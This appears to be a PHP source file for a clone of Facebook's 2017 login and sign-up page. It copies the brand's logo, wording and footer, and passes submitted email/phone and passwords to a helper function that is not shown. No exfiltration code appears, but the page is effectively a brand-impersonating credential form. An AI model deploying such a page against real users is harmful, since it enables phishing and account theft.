<?php
    include "mb/mb.php";
    session_start();
    connect();
    redirectToMain();
    
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title></title>
    <!-- Bootstrap -->
    <link href="css/bootstrap.css" rel="stylesheet">
    <link href="css/font-awesome.css" rel="stylesheet">
    <link href="css/style.css" rel="stylesheet">
</head>
<body>
    <header>
        <div class="reg_size">
            <nav>
                <a href="">
                    <img src="img/reg_fb.png">
                </a>
                <form method="post">
                    <label for="user">Email or Phone</label>
                    <label for="pass">Password</label>
                    <br>
                    <input type="text" name="user" id="user">
                    <input type="password" name="pass" id="pass">
                    <input type="submit" name="login" id="login" value="Log In">
                    <br>
                    <a href="#">Forgotten account?</a>
                </form>
                <?php
                if(isset($_POST['login'])){
                    $user = $_POST['user'];
                    $pass = $_POST['pass'];
                    loginSelect($user, $pass);
                }
                ?>
            </nav>
        </div>
    </header>
    <div class="reg_content">
        <div class="reg_size">
            <div class="left_side">
                <h2>Facebook helps you connect and share with the people in your life.</h2>
                <img src="img/reg_people.png" alt="">
            </div>

            <div class="right_side">
                <h2>Create an account</h2>
                <h3>It's free and always will be.</h3>
                <form method="post" id="reg_form" >
                    <div class="reg_form_div">
                        <input type="text" name="first_name" placeholder="First name" id="first_name" >
                        <i class="fa fa-exclamation reg_error_1"></i>
                        <input type="text" name="surname" placeholder="Surname" id="surname">
                        <i class="fa fa-exclamation reg_error_2"></i>
                        <br>
                        <input type="text" name="reg_mobile" placeholder="Mobile number or email adress" id="reg_mobile">
                        <i class="fa fa-exclamation reg_error_3"></i>
                        <br>
                        <input type="password" name="new_pass" placeholder="New password" id="new_pass">
                        <i class="fa fa-exclamation reg_error_4"></i>
                    </div>
                    <h3>Birthday</h3>
                    <select id="reg_selection_day" name="reg_day">
                        <option>Day</option>
                        <?php regOptions(); ?>
                    </select>
                    <select class="margin_select" id="reg_selection_month" name="reg_month">
                        <option>Month</option>
                        <option>Jan</option>
                        <option>Feb</option>
                        <option>Mar</option>
                        <option>Apr</option>
                        <option>May</option>
                        <option>Jun</option>
                        <option>Jul</option>
                        <option>Aug</option>
                        <option>Sept</option>
                        <option>Oct</option>
                        <option>Nov</option>
                        <option>Dec</option>
                    </select>
                    <select id="reg_selection_year" name="reg_year">
                        <option>Year</option>
                        <?php regBirthOptions(); ?>
                    </select>
                    <span><a href="#">Why do I need to provide my date of birth?</a></span>
                    <i class="fa fa-exclamation reg_error_5"></i>
                    <div class="clear"></div>
                    <div class="reg_sex">
                        <div>
                            <input type="radio" name="sex" id="female" value="female"> 
                            <label for="female">Female</label>
                        </div>
                        <div>
                            <input type="radio" name="sex" id="male" value="male">
                            <label for="male">Male</label>
                        </div>
                        <i class="fa fa-exclamation reg_error_6"></i>
                    </div>
                    <p>
                        By clicking Create an account, you agree to our <a href="#">Terms</a> and confirm that you have read our <a href="#">Data Policy</a>, including our <a href="#">Cookie Use Policy</a>. You may receive SMS message notifications from Facebook and can opt out at any time.
                    </p>
                    <input type="submit" name="register" value="Create an account" class="register_button" id="register">
                    <h4><a href="#">Create a Page </a> for a celebrity, band or business.</h4>
                </form>
            </div>

        </div>
    </div>
    <div class="clear"></div>
    <footer class="reg_footer reg_size">
        <ul>
            <li>English (UK)</li>
            <li><a href="#">ქართული</a></li>
            <li><a href="#">Русский</a></li>
            <li><a href="#">Türkçe</a></li>
            <li><a href="#">Deutsch</a></li>
            <li><a href="#">Azərbaycan dili</a></li>
            <li><a href="#">العربية</a></li>
            <li><a href="#">Français (France)</a></li>
            <li><a href="#">Ελληνικά</a></li>
            <li><a href="#">Español</a></li>
            <li><a href="#">Português (Brasil)</a></li>
            <span class="fa fa-plus"></span>
        </ul>
        <div class="clear"></div>
        <hr>
        <table>
            <tr>
                <td><a href="#">Sign Up</a></td>
                <td><a href="#">Log In</a></td>
                <td><a href="#">Messenger</a></td>
                <td><a href="#">Facebook Lite</a></td>
                <td><a href="#">Mobile</a></td>
                <td><a href="#">Find Friends</a></td>
                <td><a href="#">People</a></td>
                <td><a href="#">Pages</a></td>
                <td><a href="#">Places</a></td>
                <td><a href="#">Games</a></td>
                <td><a href="#">Locations</a></td>
            </tr>
            <tr>
                <td><a href="#">Celebrities</a></td>
                <td><a href="#">Marketplace </a></td>
                <td><a href="#">Groups</a></td>
                <td><a href="#">Moments </a></td>
                <td><a href="#">Instagram</a></td>
                <td><a href="#">About</a></td>
                <td><a href="#">Create Advert</a></td>
                <td><a href="#">Create Page</a></td>
                <td><a href="#">Developers</a></td>
                <td><a href="#">Careers</a></td>
                <td><a href="#">Privacy</a></td>

            </tr>
            <tr>
                <td><a href="#">Cookies</a></td>
                <td><a href="#">AdChoices</a></td>
                <td><a href="#">Terms</a></td>
                <td><a href="#">Help</a></td>
            </tr>
        </table>
        <p>Facebook © 2017</p>    
    </footer>
    <h1></h1>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script src="js/script.js"></script>
    <script src="js/bootstrap.js"></script>
</body>
</html>



























